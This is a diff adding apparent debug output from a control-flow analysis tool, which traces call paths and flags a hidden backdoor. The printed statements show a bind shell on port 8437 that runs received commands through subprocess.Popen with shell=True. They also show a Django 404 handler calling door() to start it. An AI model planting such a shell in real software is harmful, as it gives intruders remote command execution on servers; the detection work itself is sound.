@@ -1,0 +1,703 @@
+CFG FUNCS: 
+{'door': [id:1 line[7] parents: [] : enter: door(), id:2 line[7] parents: [6, 8] : exit: door()], 'backdoor': [id:7 line[13] parents: [6] : enter: backdoor(ip, port), id:8 line[13] parents: [35] : exit: backdoor(ip, port)], 'lemme_in': [id:36 line[51] parents: [] : enter: lemme_in(ip, port), id:37 line[51] parents: [48] : exit: lemme_in(ip, port)]}
+CFG2 FUNCS: 
+{'page_not_found': [id:56 line[32] parents: [] : enter: page_not_found(request, exception, template_name), id:57 line[32] parents: [62] : exit: page_not_found(request, exception, template_name)], 'server_error': [id:63 line[82] parents: [] : enter: server_error(request, template_name), id:64 line[82] parents: [67] : exit: server_error(request, template_name)], 'bad_request': [id:68 line[104] parents: [] : enter: bad_request(request, exception, template_name), id:69 line[104] parents: [72] : exit: bad_request(request, exception, template_name)], 'permission_denied': [id:73 line[130] parents: [] : enter: permission_denied(request, exception, template_name), id:74 line[130] parents: [77] : exit: permission_denied(request, exception, template_name)]}
+TOTALFUNCS: 
+CHILD:  58
+[]
+CHILD:  59
+[]
+CHILD:  60
+[]
+CHILD:  3
+[]
+CHILD:  4
+['gethostname', 'gethostbyname']
+CHILD:  5
+[]
+CHILD:  6
+['print']
+CHILD:  9
+[]
+CHILD:  10
+['socket']
+CHILD:  11
+['bind']
+CHILD:  12
+['listen']
+CHILD:  13
+['accept']
+CHILD:  14
+[]
+CHILD:  15
+['print']
+CHILD:  16
+['encode', 'send']
+CHILD:  17
+[]
+CHILD:  18
+['print']
+CHILD:  16
+[]
+CHILD:  35
+['close']
+CHILD:  8
+['close']
+CHILD:  2
+[]
+id:8 line[13] parents: [35] : exit: backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door()]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+id:35 line[47] parents: [34] : sock.close()
+Children:  [id:8 line[13] parents: [35] : exit: backdoor(ip, port)]
+Calls:  ['close']
+routes
+[]
+Branches
+[[]]
+biglist
+[['close']]
+
+id:34 line[46] parents: [23, 16] : client.close()
+Children:  [id:35 line[47] parents: [34] : sock.close()]
+Calls:  ['close']
+routes
+[]
+Branches
+[['close']]
+biglist
+[['close', 'close']]
+
+CHILD:  19
+[]
+CHILD:  20
+['decode']
+CHILD:  21
+['print']
+CHILD:  22
+[]
+CHILD:  23
+['print']
+CHILD:  34
+[]
+CHILD:  35
+['close']
+CHILD:  8
+['close']
+CHILD:  2
+[]
+id:8 line[13] parents: [35] : exit: backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door()]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+id:35 line[47] parents: [34] : sock.close()
+Children:  [id:8 line[13] parents: [35] : exit: backdoor(ip, port)]
+Calls:  ['close']
+routes
+[]
+Branches
+[[]]
+biglist
+[['close']]
+
+id:34 line[46] parents: [23, 16] : client.close()
+Children:  [id:35 line[47] parents: [34] : sock.close()]
+Calls:  ['close']
+routes
+[]
+Branches
+[['close']]
+biglist
+[['close', 'close']]
+
+id:23 line[30] parents: [22] : break
+Children:  [id:34 line[46] parents: [23, 16] : client.close()]
+Calls:  []
+routes
+[]
+Branches
+[['close', 'close']]
+biglist
+[['close', 'close']]
+
+id:22 line[29] parents: [21] : print('Connection closed')
+Children:  [id:23 line[30] parents: [22] : break]
+Calls:  ['print']
+routes
+[]
+Branches
+[['close', 'close']]
+biglist
+[['close', 'close']]
+
+CHILD:  24
+[]
+CHILD:  25
+['str', 'Popen']
+CHILD:  26
+['communicate']
+CHILD:  27
+[]
+CHILD:  28
+[]
+CHILD:  29
+['encode', 'send']
+CHILD:  16
+['print']
+CHILD:  35
+['close']
+CHILD:  8
+['close']
+CHILD:  2
+[]
+id:8 line[13] parents: [35] : exit: backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door()]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+id:35 line[47] parents: [34] : sock.close()
+Children:  [id:8 line[13] parents: [35] : exit: backdoor(ip, port)]
+Calls:  ['close']
+routes
+[]
+Branches
+[[]]
+biglist
+[['close']]
+
+id:34 line[46] parents: [23, 16] : client.close()
+Children:  [id:35 line[47] parents: [34] : sock.close()]
+Calls:  ['close']
+routes
+[]
+Branches
+[['close']]
+biglist
+[['close', 'close']]
+
+id:29 line[36] parents: [28] : print(' ')
+Children:  [id:16 line[22] parents: [15, 29, 31, 33, 18] : _while: True]
+Calls:  ['print']
+routes
+[]
+Branches
+[['close', 'close']]
+biglist
+[['close', 'close']]
+
+id:28 line[35] parents: [27] : client.send(' '.encode())
+Children:  [id:29 line[36] parents: [28] : print(' ')]
+Calls:  ['encode', 'send']
+routes
+[]
+Branches
+[['close', 'close']]
+biglist
+[['encode', 'send', 'close', 'close']]
+
+CHILD:  30
+[]
+CHILD:  31
+['print']
+CHILD:  16
+['send']
+CHILD:  35
+['close']
+CHILD:  8
+['close']
+CHILD:  2
+[]
+id:8 line[13] parents: [35] : exit: backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door()]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+id:35 line[47] parents: [34] : sock.close()
+Children:  [id:8 line[13] parents: [35] : exit: backdoor(ip, port)]
+Calls:  ['close']
+routes
+[]
+Branches
+[[]]
+biglist
+[['close']]
+
+id:34 line[46] parents: [23, 16] : client.close()
+Children:  [id:35 line[47] parents: [34] : sock.close()]
+Calls:  ['close']
+routes
+[]
+Branches
+[['close']]
+biglist
+[['close', 'close']]
+
+id:31 line[39] parents: [30] : client.send(STDERR)
+Children:  [id:16 line[22] parents: [15, 29, 31, 33, 18] : _while: True]
+Calls:  ['send']
+routes
+[]
+Branches
+[['close', 'close']]
+biglist
+[['send', 'close', 'close']]
+
+id:30 line[38] parents: [27] : print(f'STDERR: {STDERR}')
+Children:  [id:31 line[39] parents: [30] : client.send(STDERR)]
+Calls:  ['print']
+routes
+[]
+Branches
+[['send', 'close', 'close']]
+biglist
+[['send', 'close', 'close']]
+
+id:27 line[34] parents: [26] : _if: (not STDERR)
+Children:  [id:28 line[35] parents: [27] : client.send(' '.encode()), id:30 line[38] parents: [27] : print(f'STDERR: {STDERR}')]
+Calls:  []
+routes
+[]
+Branches
+[['encode', 'send', 'close', 'close'], ['send', 'close', 'close']]
+biglist
+[['encode', 'send', 'close', 'close'], ['send', 'close', 'close']]
+
+CHILD:  32
+[]
+CHILD:  33
+['print']
+CHILD:  16
+['send']
+CHILD:  35
+['close']
+CHILD:  8
+['close']
+CHILD:  2
+[]
+id:8 line[13] parents: [35] : exit: backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door()]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+id:35 line[47] parents: [34] : sock.close()
+Children:  [id:8 line[13] parents: [35] : exit: backdoor(ip, port)]
+Calls:  ['close']
+routes
+[]
+Branches
+[[]]
+biglist
+[['close']]
+
+id:34 line[46] parents: [23, 16] : client.close()
+Children:  [id:35 line[47] parents: [34] : sock.close()]
+Calls:  ['close']
+routes
+[]
+Branches
+[['close']]
+biglist
+[['close', 'close']]
+
+id:33 line[42] parents: [32] : client.send(STDOUT)
+Children:  [id:16 line[22] parents: [15, 29, 31, 33, 18] : _while: True]
+Calls:  ['send']
+routes
+[]
+Branches
+[['close', 'close']]
+biglist
+[['send', 'close', 'close']]
+
+id:32 line[41] parents: [26] : print(f'STDOUT: {STDOUT}')
+Children:  [id:33 line[42] parents: [32] : client.send(STDOUT)]
+Calls:  ['print']
+routes
+[]
+Branches
+[['send', 'close', 'close']]
+biglist
+[['send', 'close', 'close']]
+
+id:26 line[33] parents: [25] : _if: (not STDOUT)
+Children:  [id:27 line[34] parents: [26] : _if: (not STDERR), id:32 line[41] parents: [26] : print(f'STDOUT: {STDOUT}')]
+Calls:  []
+routes
+[]
+Branches
+[['encode', 'send', 'close', 'close'], ['send', 'close', 'close']]
+biglist
+[['encode', 'send', 'close', 'close'], ['send', 'close', 'close']]
+
+id:25 line[32] parents: [24] : (STDOUT, STDERR) = comm.communicate()
+Children:  [id:26 line[33] parents: [25] : _if: (not STDOUT)]
+Calls:  ['communicate']
+routes
+[]
+Branches
+[['encode', 'send', 'close', 'close'], ['send', 'close', 'close']]
+biglist
+[['communicate', 'encode', 'send', 'close', 'close'], ['communicate', 'send', 'close', 'close']]
+
+id:24 line[31] parents: [21] : comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+Children:  [id:25 line[32] parents: [24] : (STDOUT, STDERR) = comm.communicate()]
+Calls:  ['str', 'Popen']
+routes
+[]
+Branches
+[['communicate', 'encode', 'send', 'close', 'close'], ['communicate', 'send', 'close', 'close']]
+biglist
+[['str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:21 line[28] parents: [20] : _if: (not cmd)
+Children:  [id:22 line[29] parents: [21] : print('Connection closed'), id:24 line[31] parents: [21] : comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)]
+Calls:  []
+routes
+[]
+Branches
+[['close', 'close'], ['str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['close', 'close'], ['str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:20 line[27] parents: [19] : print(f'Received: {cmd}')
+Children:  [id:21 line[28] parents: [20] : _if: (not cmd)]
+Calls:  ['print']
+routes
+[]
+Branches
+[['close', 'close'], ['str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['close', 'close'], ['str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:19 line[26] parents: [18] : cmd = client.recv(1024).decode('utf-8')
+Children:  [id:20 line[27] parents: [19] : print(f'Received: {cmd}')]
+Calls:  ['decode']
+routes
+[]
+Branches
+[['close', 'close'], ['str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:18 line[25] parents: [17] : _if: True
+Children:  [id:16 line[22] parents: [15, 29, 31, 33, 18] : _while: True, id:19 line[26] parents: [18] : cmd = client.recv(1024).decode('utf-8')]
+Calls:  []
+routes
+[]
+Branches
+[['close', 'close'], ['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['close', 'close'], ['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:17 line[23] parents: [16] : print('in while')
+Children:  [id:18 line[25] parents: [17] : _if: True]
+Calls:  ['print']
+routes
+[]
+Branches
+[['close', 'close'], ['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['close', 'close'], ['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+CHILD:  34
+[]
+CHILD:  35
+['close']
+CHILD:  8
+['close']
+CHILD:  2
+[]
+id:8 line[13] parents: [35] : exit: backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door()]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+id:35 line[47] parents: [34] : sock.close()
+Children:  [id:8 line[13] parents: [35] : exit: backdoor(ip, port)]
+Calls:  ['close']
+routes
+[]
+Branches
+[[]]
+biglist
+[['close']]
+
+id:34 line[46] parents: [23, 16] : client.close()
+Children:  [id:35 line[47] parents: [34] : sock.close()]
+Calls:  ['close']
+routes
+[]
+Branches
+[['close']]
+biglist
+[['close', 'close']]
+
+id:16 line[22] parents: [15, 29, 31, 33, 18] : _while: True
+Children:  [id:17 line[23] parents: [16] : print('in while'), id:34 line[46] parents: [23, 16] : client.close()]
+Calls:  []
+routes
+[]
+Branches
+[['close', 'close'], ['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['close', 'close'], ['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:15 line[20] parents: [14] : client.send(header.encode())
+Children:  [id:16 line[22] parents: [15, 29, 31, 33, 18] : _while: True]
+Calls:  ['encode', 'send']
+routes
+[]
+Branches
+[['close', 'close'], ['decode', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:14 line[19] parents: [13] : print(f'Header: {header}')
+Children:  [id:15 line[20] parents: [14] : client.send(header.encode())]
+Calls:  ['print']
+routes
+[]
+Branches
+[['encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:13 line[18] parents: [12] : header = f'{getpass.getuser()}@{platform.node()}:{os.getcwd()}$ '
+Children:  [id:14 line[19] parents: [13] : print(f'Header: {header}')]
+Calls:  []
+routes
+[]
+Branches
+[['encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:12 line[17] parents: [11] : (client, addr) = sock.accept()
+Children:  [id:13 line[18] parents: [12] : header = f'{getpass.getuser()}@{platform.node()}:{os.getcwd()}$ ']
+Calls:  ['accept']
+routes
+[]
+Branches
+[['encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['accept', 'encode', 'send', 'close', 'close'], ['accept', 'encode', 'send', 'decode', 'close', 'close'], ['accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:11 line[16] parents: [10] : sock.listen(1)
+Children:  [id:12 line[17] parents: [11] : (client, addr) = sock.accept()]
+Calls:  ['listen']
+routes
+[]
+Branches
+[['accept', 'encode', 'send', 'close', 'close'], ['accept', 'encode', 'send', 'decode', 'close', 'close'], ['accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['listen', 'accept', 'encode', 'send', 'close', 'close'], ['listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:10 line[15] parents: [9] : sock.bind((ip, port))
+Children:  [id:11 line[16] parents: [10] : sock.listen(1)]
+Calls:  ['bind']
+routes
+[]
+Branches
+[['listen', 'accept', 'encode', 'send', 'close', 'close'], ['listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:9 line[14] parents: [7] : sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+Children:  [id:10 line[15] parents: [9] : sock.bind((ip, port))]
+Calls:  ['socket']
+routes
+[]
+Branches
+[['bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+id:7 line[13] parents: [6] : enter: backdoor(ip, port)
+Children:  [id:9 line[14] parents: [7] : sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)]
+Calls:  []
+routes
+[]
+Branches
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+biglist
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close']]
+
+CHILD:  2
+[]
+id:8 line[13] parents: [35] : exit: backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door()]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+CHILD:  2
+['backdoor']
+CHILD:  7
+['backdoor']
+FOUND
+id:6 line[11] parents: [5] : backdoor(ip, port)
+Children:  [id:2 line[7] parents: [6, 8] : exit: door(), id:7 line[13] parents: [6] : enter: backdoor(ip, port)]
+Calls:  ['backdoor']
+routes
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], []]
+Branches
+[[]]
+biglist
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], []]
+
+id:5 line[10] parents: [4] : print(f'Making backdoor with IP: {ip} and port: {port}')
+Children:  [id:6 line[11] parents: [5] : backdoor(ip, port)]
+Calls:  ['print']
+routes
+[]
+Branches
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], []]
+biglist
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], []]
+
+id:4 line[9] parents: [3] : port = 8437
+Children:  [id:5 line[10] parents: [4] : print(f'Making backdoor with IP: {ip} and port: {port}')]
+Calls:  []
+routes
+[]
+Branches
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], []]
+biglist
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], []]
+
+id:3 line[8] parents: [1] : ip = socket.gethostbyname(socket.gethostname())
+Children:  [id:4 line[9] parents: [3] : port = 8437]
+Calls:  ['gethostname', 'gethostbyname']
+routes
+[]
+Branches
+[['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], []]
+biglist
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], ['gethostname', 'gethostbyname']]
+
+id:1 line[7] parents: [] : enter: door()
+Children:  [id:3 line[8] parents: [1] : ip = socket.gethostbyname(socket.gethostname())]
+Calls:  []
+routes
+[]
+Branches
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], ['gethostname', 'gethostbyname']]
+biglist
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], ['gethostname', 'gethostbyname']]
+
+CHILD:  61
+['door']
+CHILD:  62
+['HttpResponseNotFound']
+CHILD:  57
+[]
+id:62 line[79] parents: [61] : return HttpResponseNotFound(body, content_type=content_type)
+Children:  [id:57 line[32] parents: [62] : exit: page_not_found(request, exception, template_name)]
+Calls:  []
+routes
+[]
+Branches
+[[]]
+biglist
+[[]]
+
+id:61 line[57] parents: [60] : context = {
+    'request_path': quote(request.path),
+    'exception': exception_repr,
+}
+Children:  [id:62 line[79] parents: [61] : return HttpResponseNotFound(body, content_type=content_type)]
+Calls:  ['HttpResponseNotFound']
+routes
+[]
+Branches
+[[]]
+biglist
+[['HttpResponseNotFound']]
+
+id:60 line[49] parents: [59] : door()
+Children:  [id:61 line[57] parents: [60] : context = {
+    'request_path': quote(request.path),
+    'exception': exception_repr,
+}]
+Calls:  ['door']
+routes
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close'], ['gethostname', 'gethostbyname'], []]
+Branches
+[['HttpResponseNotFound']]
+biglist
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+
+id:59 line[46] parents: [58] : exception_repr = exception.__class__.__name__
+Children:  [id:60 line[49] parents: [59] : door()]
+Calls:  []
+routes
+[]
+Branches
+[['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'encode', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'socket', 'bind', 'listen', 'accept', 'encode', 'send', 'decode', 'str', 'Popen', 'communicate', 'send', 'close', 'close', 'HttpResponseNotFound'], ['gethostname', 'gethostbyname', 'HttpResponseNotFound'], ['HttpResponseNotFound']]
+biglist
